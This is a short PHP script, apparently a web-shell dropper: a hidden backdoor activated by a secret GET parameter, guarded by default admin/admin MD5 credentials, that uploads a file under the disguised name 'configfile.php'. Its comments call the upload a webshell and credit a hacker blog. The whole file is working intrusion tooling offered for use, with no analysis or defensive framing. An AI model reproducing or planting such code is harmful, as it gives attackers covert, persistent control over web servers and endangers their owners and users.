<?php
session_start(); /* cyber-oxyde.blogspot.mx | fb.com/cyberoxyde */
$me="21232f297a57a5a743894a0e4a801fc3"; // md5 user | default: admin
$password="21232f297a57a5a743894a0e4a801fc3"; // md5 passw | default: admin
$getvar="stormdark"; //var GET to activate the form | -> index.php?$getvar
$close="close"; // var to close the sesion | index.php?$getvar=$close
@$user=$_POST[user];
@$pass=$_POST[pass];
function subir()
{
    $shellname="configfile.php"; // Default name which will be set to the uploaded webshell
    if(@isset($_FILES[upload]))
    {
        if(move_uploaded_file($_FILES["upload"]["tmp_name"], $shellname))
        {
            echo "<h5>Archivo <a href='$shellname'>$shellname</a> subido</h5>";
        }else
        {
            echo "<h5>Error al subir archivo</h5>";
        }
    }else
    {
        echo '
        <form action="" method="post" enctype="multipart/form-data"> 
        <input type="file" name="upload"><br>
        <input type="submit">
        </form>
        ';
    }
}
if(isset($_GET[$getvar]))
{
    if(@$_SESSION['logged']=='yes')
    {
        subir();
    }else
    {
        if(isset($user) && isset($pass))
        {
            if($me==(md5($user)) && $password==(md5($pass)))
            {
                $_SESSION['logged']='yes';
                subir();
            }else
            {
                echo "<h5>wrong!</h5>";
            }
        }else
        {
            echo '
            <form action="" method="post">
            <input type="text" name="user"><br>
            <input type="text" name="pass"><br>
            <input type="submit" name"submit">
            </form>
            ';
        }
    }
    if($_GET[$getvar]==$close)
    {
        session_destroy();
        echo "<h5>sesion cerrada</h5>";
    };
}
?>
